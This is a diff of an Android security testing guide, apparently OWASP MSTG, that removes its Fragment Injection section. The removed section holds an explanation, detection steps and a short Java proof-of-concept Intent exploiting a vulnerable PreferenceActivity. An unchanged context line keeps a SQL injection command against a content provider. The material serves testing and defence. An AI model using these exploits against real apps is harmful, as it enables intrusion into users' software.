@@ -139,18 +139,6 @@ Once the permission `START_MAIN_ACTIVITY` has been created, apps can request it 
 
 We recommend using a reverse-domain annotation when registering a permission, as in the example above (e.g. `com.domain.application.permission`) in order to avoid collisions with other applications.
 
-### Fragment Injection
-
-Android SDK offers developers a way to present a [`PreferencesActivity`](https://developer.android.com/reference/android/preference/PreferenceActivity.html "Preference Activity") to users, allowing the developers to extend and adapt this abstract class.
-
-This abstract class parses the extra data fields of an Intent, in particular, the `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `Preference Activity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)` fields.
-
-The first field is expected to contain the `Fragment` class name, and the second one is expected to contain the input bundle passed to the `Fragment`.
-
-Because the `PreferenceActivity` uses reflection to load the fragment, an arbitrary class may be loaded inside the package or the Android SDK. The loaded class runs in the context of the application that exports this activity.
-
-With this vulnerability, an attacker can call fragments inside the target application or run the code present in other classes' constructors. Any class that's passed in the Intent and does not extend the Fragment class will cause a `java.lang.CastException`, but the empty constructor will be executed before the exception is thrown, allowing the code present in the class constructor to be executed.
-
 ### WebViews
 
 #### URL Loading in WebViews
@@ -672,88 +660,6 @@ SQL injection can be exploited with the following command. Instead of getting th
 ```bash
 # content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
 ```
-
-## Testing for Fragment Injection (MSTG-PLATFORM-2)
-
-### Overview
-
-To prevent [fragment injection](#fragment-injection "fragment injection"), a new method called `isValidFragment` was added in Android 4.4 (API level 19). Developers can override `isValidFragment` and verify that the given fragment is a valid type.
-
-The default implementation returns `true` on versions older than Android 4.4 (API level 19); it will throw an exception on later versions.
-
-### Static Analysis
-
-Steps:
-
-- Check if `android:targetSdkVersion` less than 19.
-- Find exported Activities that extend the `PreferenceActivity` class.
-- Determine whether the method `isValidFragment` has been overridden.
-- If the app currently sets its `android:targetSdkVersion` in the manifest to a value less than 19 and the vulnerable class does not contain any implementation of `isValidFragment` then, the vulnerability is inherited from the `PreferenceActivity`.
-- In order to fix, developers should either update the `android:targetSdkVersion` to 19 or higher. Alternatively, if the `android:targetSdkVersion` cannot be updated, then developers should implement `isValidFragment` as described.
-
-The following example shows an Activity that extends this activity:
-
-```java
-public class MyPreferences extends PreferenceActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-    }
-}
-```
-
-The following examples show the `isValidFragment` method being overridden with an implementation that allows the loading of `MyPreferenceFragment` only:
-
-```java
-@Override
-protected boolean isValidFragment(String fragmentName)
-{
-return "com.fullpackage.MyPreferenceFragment".equals(fragmentName);
-}
-
-```
-
-### Example of Vulnerable App and Exploitation
-
-MainActivity.class
-
-```java
-public class MainActivity extends PreferenceActivity {
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-    }
-}
-```
-
-MyFragment.class
-
-```java
-public class MyFragment extends Fragment {
-    public void onCreate (Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-    }
-    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
-        View v = inflater.inflate(R.layout.fragmentLayout, null);
-        WebView myWebView = (WebView) wv.findViewById(R.id.webview);
-        myWebView.getSettings().setJavaScriptEnabled(true);
-        myWebView.loadUrl(this.getActivity().getIntent().getDataString());
-        return v;
-    }
-}
-```
-
-To exploit this vulnerable Activity, you can create an application with the following code:
-
-```java
-Intent i = new Intent();
-i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
-i.setClassName("pt.claudio.insecurefragment","pt.claudio.insecurefragment.MainActivity");
-i.putExtra(":android:show_fragment","pt.claudio.insecurefragment.MyFragment");
-i.setData(Uri.parse("https://security.claudio.pt"));
-startActivity(i);
-```
-
-The [Vulnerable App](https://github.com/clviper/android-fragment-injection/raw/master/vulnerableapp.apk "Vulnerable App Fragment Injection") and [Exploit PoC App](https://github.com/clviper/android-fragment-injection/blob/master/exploit.apk "PoC App to exploit Fragment Injection") are available for downloading.
 
 ## Testing for URL Loading in WebViews (MSTG-PLATFORM-2)
 
@@ -2001,11 +1907,6 @@ Open a WebView accessing sensitive data and then log out of the application. Acc
 ### Android App Bundles and updates
 
 - <https://developer.android.com/guide/app-bundle/in-app-updates>
-
-### Android Fragment Injection
-
-- <https://www.synopsys.com/blogs/software-security/fragment-injection/>
-- <https://securityintelligence.com/wp-content/uploads/2013/12/android-collapses-into-fragments.pdf>
 
 ### Android Permissions Documentation
 
